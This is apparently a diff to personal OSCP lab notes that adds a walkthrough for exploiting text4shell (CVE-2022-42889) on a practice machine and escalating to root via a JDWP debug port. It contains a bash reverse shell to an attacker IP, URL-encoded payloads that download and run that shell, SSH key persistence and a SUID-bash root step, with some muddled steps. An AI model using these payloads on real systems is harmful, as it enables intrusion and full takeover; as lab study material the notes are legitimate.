@@ -2532,6 +2532,40 @@ gcc -o exploit-2 exploit-2.c
 
 ```
 
+### JDWP - text4shell - Linux Exploit
+- OSCP B .150 Berlin machine, Find port 22 ssh, 8080  http-proxy(Apache Commons Text 1.8,**text4shell**) After running the **gobuster** identified /search, /CHANGLOG.
+- Reference [Medium](https://infosecwriteups.com/text4shell-poc-cve-2022-42889-f6e9df41b3b7)
+```bash
+echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
+# In Browser
+http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
+http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
+#IN KALI VM
+nc -nlvp 443
+```
+
+- In privilege escalation part ran the linpeas
+- Processes, Crons, Timers, Services and Sockets  tab mentioned (root java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java)
+- We need to set the SUID [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1273351747758456913) or get revshell
+- Optional Stable shell Generated ssh keys
+```bash
+ssh-keygen -t rsa -b 4096
+#PATH
+cat id_rsa.pub > authorized_keys
+#Copy the .pub file kali vm then connect and port forward, before that check
+sudo nc -p 8000 <KALIIP>
+#Target shell **ll /bin/bash ** SUID bit not set
+ssh -i id_rsa150 dev@192.168.197.150 -L 8000:127.0.0.1:8000
+#Check Nmap port 8000 is open
+#Target .150
+nc 127.0.0.1 5000 -z
+#Target NOW **SUID** bit not set
+ **ll /bin/bash **
+/bin/bash -p
+id
+# euid=0 (root)
+```
+
 # Resources
 - [Linux Exploits GTFOBins](https://gtfobins.github.io/)
 - [Windows Exploits LOLBAS](https://lolbas-project.github.io/#)
